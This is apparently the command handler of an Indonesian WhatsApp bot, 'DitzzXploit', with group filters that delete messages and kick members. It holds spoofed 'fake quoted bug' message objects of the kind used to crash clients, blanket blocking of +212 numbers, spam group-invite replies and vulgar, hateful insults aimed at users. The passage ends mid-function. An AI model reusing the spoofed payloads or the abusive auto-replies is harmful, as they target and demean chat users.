module.exports = async (DitzzXploit, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const { type } = m
const DigitalOcean = require('digitalocean');
const botNumber = await DitzzXploit.decodeJid(DitzzXploit.user.id)
const sender = m.key.fromMe ? (DitzzXploit.user.id.split(':')[0]+'@s.whatsapp.net' || DitzzXploit.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await DitzzXploit.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false 
const API_TOKEN = global.apitokendo;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format("HH:mm:ss");
const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
const ffstalk = require('./scrape/ffstalk')
const { Client } = require('ssh2');
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { remini } = require('./freya/remini')
const jsobfus = require('javascript-obfuscator')
const { mediafireDl } = require('./all/database/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const content = JSON.stringify(m.message)
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const jangan = m.isGroup ? pler.includes(m.chat) : false
const { exec } = require('child_process');
const {payment, apikeyOtpKu} = require("./all/settings.js")
let depositPath = "./database/deposit/"
let topupPath = "./database/topup/"
const db_user = JSON.parse(fs.readFileSync('./database/pengguna.json'));
//ambilfitur
const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const getCase = (cases) => {
            return "case  "+`'${cases}'`+fs.readFileSync("./appearance.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
        }
        
        const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() *
    charactersLength));
    }
    return result
}
//CONSTNYA EHEM😁

//antilink
let antipromosi = JSON.parse(fs.readFileSync('./database/antipromosi.json'))
let autojpm = JSON.parse(fs.readFileSync('./database/autojpm.json'))
let antivirus = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let antipanel = JSON.parse(fs.readFileSync('./database/antipanel.json'))
let antitoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let antilinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let antilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let antilinktwitter =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let antilinktiktok =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let antilinktelegram =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let antilinkfacebook =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let antilinkinstagram =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let antilinkytchannel =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let antilinkytvideo =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};
    
    function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = DitzzXploit.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = DitzzXploit.sendMessage(from, { text: teks, mentions: mems }, { quoted: m})
return res
}
    }
    
//BanUser
const banUser = await DitzzXploit.fetchBlocklist

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return DitzzXploit.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}
//total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./appearance.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

     let cekUser2 = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
     }
     
// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await DitzzXploit.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await DitzzXploit.getName(i + '@s.whatsapp.net')}\n
FN:${await DitzzXploit.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

const XeonStickWait = () => {
        let DitzzKroco = fs.readFileSync('./sticker_reply/wait.webp')
        DitzzXploit.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickAdmin = () => {
        let DitzzKroco = fs.readFileSync('./sticker_reply/admin.webp')
        DitzzXploit.sendMessage(from, { sticker: DitzzKroco }, { quoted: m })
        }
        const DitzzStickBotAdmin = () => {
        let DitzzKroco = fs.readFileSync('./XeonMedia/theme/sticker_reply/botadmin.webp')
        DitzzXploit.sendMessage(from, { sticker: DitzzKroco }, { quoted: m })
        }
        const DitzzStikOwn = () => {
        let DitzzKroco = fs.readFileSync('./sticker_reply/owner.webp')
        DitzzXploit.sendMessage(from, { sticker: DitzzKroco }, { quoted: m })
        }
        const XeonStickGroup = () => {
        let Kroco = fs.readFileSync('./sticker_reply/group.webp')
        DitzzXploit.sendMessage(from, { sticker: Kroco }, { quoted: m })
        }
        const DitzzStickPrivate = () => {
        let Kroco = fs.readFileSync('./sticker_reply/private.webp')
        DitzzXploit.sendMessage(from, { sticker: Kroco }, { quoted: m })
        }

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await DitzzXploit.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
DitzzXploit.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
DitzzXploit.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "DitzzXploit`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://www.youtube.com/@DitzzXploit", 
"sourceUrl": "https://www.youtube.com/@DitzzXploit" }}}, { quoted: m }) } 

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}


// Pastikan Anda memiliki API token yang valid dari DigitalOcean dan disimpan dalam variabel API_TOKEN

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello Kontol 👿`
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `BOT PRIVATE DitzzXploit`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;DitzzXploitBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/63e5b663b9883c6de9824.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
 // Antipromosi
  if (antipromosi)
  if (budy.includes(`akun old`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`akun ml old`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\n@KEBELET DUIT YA DECK? MATI IBU LU ANJ!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`1jt`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`700k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`mau pasang bot pushttyhkontak`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`take agjjbkun nya`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK? MATI IBU LU ANJ!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
// auto jpm
        if (autojpm) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply(mess.only.badmin)
        let gclink = (`https://chat.whatsapp.com/`+await DitzzXploit.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return DitzzXploit.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EGI9AnELtyL6uG36BYanyp`})
        if (isAdmins) return DitzzXploit.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EGI9AnELtyL6uG36BYanyp`})
        if (!isOwner) return DitzzXploit.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EGI9AnELtyL6uG36BYanyp`})
        kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			DitzzXploit.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EGI9AnELtyL6uG36BYanyp`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
 
 // Antiwame by xeon
  if (antiwame)
  if (budy.includes(`wa.meee`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://s.id/PediaBotz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://s.id/PediaBotz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiwame)
  if (budy.includes(`wa.yhme/`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://s.id/PediaBotz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://s.id/PediaBotz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirus by xeon
  if (antivirus) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply(mess.only.badmin)
          await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			DitzzXploit.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//antilink youtube video by xeon
if (antilinkytvideo)
if (budy.includes("https://youtu.beyhhv/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (antilinkytchannel)
   if (budy.includes("https://youtube.cgguom/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (antilinkinstagram)
   if (budy.includes("https://www.instagram.chvgom/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (antilinkfacebook)
   if (budy.includes("https://facebook.fghhcom/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (antilinktelegram)
   if (budy.includes("https://t.mfge/")){
if (antilinktelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (antilinktiktok)
   if (budy.includes("https://www.tiktok.cogghm/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (antilinktwitter)
   if (budy.includes("https://twitteghhr.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (antilinkall)
   if (budy.includes("httpsyyyy://")){
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://s.id/PediaBotz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
